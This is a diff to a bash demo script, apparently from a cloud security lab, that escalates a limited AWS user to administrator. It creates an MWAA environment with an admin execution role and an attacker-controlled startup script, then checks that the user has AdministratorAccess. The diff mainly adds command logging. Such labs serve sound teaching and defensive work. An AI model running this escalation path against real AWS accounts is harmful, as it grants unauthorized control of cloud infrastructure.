@@ -5,7 +5,9 @@
 # can escalate to admin by creating an MWAA environment with an admin execution role
 # and a malicious startup script that attaches AdministratorAccess to the starting user
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -14,6 +16,24 @@ YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 MAGENTA='\033[0;35m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-mwaa-001-to-admin-starting-user"
@@ -92,7 +112,7 @@ echo "Security Group: $SECURITY_GROUP_ID"
 echo "Attacker Bucket: $ATTACKER_BUCKET_NAME"
 echo "Startup Script Key: $STARTUP_SCRIPT_S3_KEY"
 echo "DAGs S3 Key: $DAGS_S3_KEY"
-echo -e "${GREEN}OK Retrieved configuration from Terraform${NC}\n"
+echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
@@ -107,6 +127,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -114,21 +135,23 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
     echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
     exit 1
 fi
-echo -e "${GREEN}OK Verified starting user identity${NC}\n"
+echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
-echo -e "${GREEN}OK Retrieved account ID${NC}\n"
+echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
 # Step 4: Verify lack of admin permissions
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
-    echo -e "${RED}Warning: Unexpectedly have admin permissions already${NC}"
+    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
-    echo -e "${GREEN}OK Confirmed: Cannot list IAM users (as expected)${NC}"
+    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
 fi
 echo ""
 
@@ -151,6 +174,7 @@ SUBNET_1=$(echo "$PRIVATE_SUBNET_IDS" | cut -d',' -f1)
 SUBNET_2=$(echo "$PRIVATE_SUBNET_IDS" | cut -d',' -f2)
 
 echo "Creating MWAA environment..."
+show_attack_cmd "aws mwaa create-environment --region \"$AWS_REGION\" --name \"$ENVIRONMENT_NAME\" --execution-role-arn \"$ADMIN_ROLE_ARN\" --source-bucket-arn \"arn:aws:s3:::$ATTACKER_BUCKET_NAME\" --dag-s3-path \"$DAGS_S3_KEY\" --startup-script-s3-path \"$STARTUP_SCRIPT_S3_KEY\" --network-configuration \"SubnetIds=$SUBNET_1,$SUBNET_2,SecurityGroupIds=$SECURITY_GROUP_ID\" --environment-class \"mw1.small\" --airflow-version \"2.8.1\" --webserver-access-mode \"PUBLIC_ONLY\" --max-workers 2 --min-workers 1 --output json"
 aws mwaa create-environment \
     --region "$AWS_REGION" \
     --name "$ENVIRONMENT_NAME" \
@@ -167,7 +191,7 @@ aws mwaa create-environment \
     --output json > /dev/null
 
 if [ $? -eq 0 ]; then
-    echo -e "${GREEN}OK Successfully initiated MWAA environment creation!${NC}"
+    echo -e "${GREEN}✓ Successfully initiated MWAA environment creation!${NC}"
 else
     echo -e "${RED}Error: Failed to create MWAA environment${NC}"
     exit 1
@@ -184,6 +208,7 @@ ELAPSED=0
 CHECK_INTERVAL=60  # Check every minute
 
 while [ $ELAPSED -lt $MAX_WAIT ]; do
+    show_cmd "aws mwaa get-environment --region \"$AWS_REGION\" --name \"$ENVIRONMENT_NAME\" --query 'Environment.Status' --output text"
     STATUS=$(aws mwaa get-environment \
         --region "$AWS_REGION" \
         --name "$ENVIRONMENT_NAME" \
@@ -195,11 +220,11 @@ while [ $ELAPSED -lt $MAX_WAIT ]; do
 
     if [ "$STATUS" = "AVAILABLE" ]; then
         echo ""
-        echo -e "${GREEN}OK MWAA environment is now available!${NC}"
+        echo -e "${GREEN}✓ MWAA environment is now available!${NC}"
         break
     elif [ "$STATUS" = "CREATE_FAILED" ]; then
         echo ""
-        echo -e "${RED}X MWAA environment creation failed!${NC}"
+        echo -e "${RED}✗ MWAA environment creation failed!${NC}"
         echo "Fetching error details..."
         aws mwaa get-environment \
             --region "$AWS_REGION" \
@@ -216,7 +241,7 @@ while [ $ELAPSED -lt $MAX_WAIT ]; do
 done
 
 if [ $ELAPSED -ge $MAX_WAIT ]; then
-    echo -e "${RED}X Timeout: Environment did not become available within expected time${NC}"
+    echo -e "${RED}✗ Timeout: Environment did not become available within expected time${NC}"
     echo -e "${RED}Please run cleanup_attack.sh to clean up${NC}"
     exit 1
 fi
@@ -227,20 +252,21 @@ echo -e "${YELLOW}Step 7: Waiting for startup script execution and IAM policy pr
 echo "The startup script runs when the environment starts up..."
 echo "Waiting 30 seconds for the startup script to execute and IAM changes to propagate..."
 sleep 30
-echo -e "${GREEN}OK Startup script should have executed${NC}\n"
+echo -e "${GREEN}✓ Startup script should have executed${NC}\n"
 
 # Step 8: Verify admin access
 echo -e "${YELLOW}Step 8: Verifying administrator access${NC}"
 echo "Checking if AdministratorAccess is now attached to starting user..."
 
 # Check attached policies
+show_cmd "aws iam list-attached-user-policies --user-name \"$STARTING_USER\" --query 'AttachedPolicies[*].PolicyArn' --output text"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
     --user-name "$STARTING_USER" \
     --query 'AttachedPolicies[*].PolicyArn' \
     --output text 2>/dev/null || echo "")
 
 if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
-    echo -e "${GREEN}OK AdministratorAccess policy is attached to $STARTING_USER!${NC}"
+    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER!${NC}"
 else
     echo -e "${YELLOW}Note: AdministratorAccess not yet visible. Checking again after waiting...${NC}"
     sleep 15
@@ -249,9 +275,10 @@ fi
 echo ""
 echo "Attempting to list IAM users..."
 
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
-    echo -e "${GREEN}OK Successfully listed IAM users!${NC}"
-    echo -e "${GREEN}OK ADMIN ACCESS CONFIRMED${NC}"
+    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
+    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
 else
     echo -e "${YELLOW}Note: May need to wait longer for IAM propagation${NC}"
     echo "The startup script should have attached AdministratorAccess to $STARTING_USER"
@@ -260,7 +287,7 @@ echo ""
 
 # Summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (limited permissions)"
@@ -271,10 +298,17 @@ echo "5. Startup script attached AdministratorAccess to starting user"
 echo "6. Achieved: Administrator Access"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
-echo -e "  $STARTING_USER -> (iam:PassRole + airflow:CreateEnvironment)"
-echo -e "  -> MWAA Environment with $ADMIN_ROLE"
-echo -e "  -> (Startup script execution with admin credentials)"
-echo -e "  -> (iam:AttachUserPolicy) -> Admin Access"
+echo -e "  $STARTING_USER → (iam:PassRole + airflow:CreateEnvironment)"
+echo -e "  → MWAA Environment with $ADMIN_ROLE"
+echo -e "  → (Startup script execution with admin credentials)"
+echo -e "  → (iam:AttachUserPolicy) → Admin Access"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- MWAA Environment: $ENVIRONMENT_NAME"
@@ -292,3 +326,6 @@ echo -e "${RED}${NC}"
 echo -e "${RED}Cleanup will take 10-20 minutes to delete the environment.${NC}"
 echo -e "${RED}========================================${NC}"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
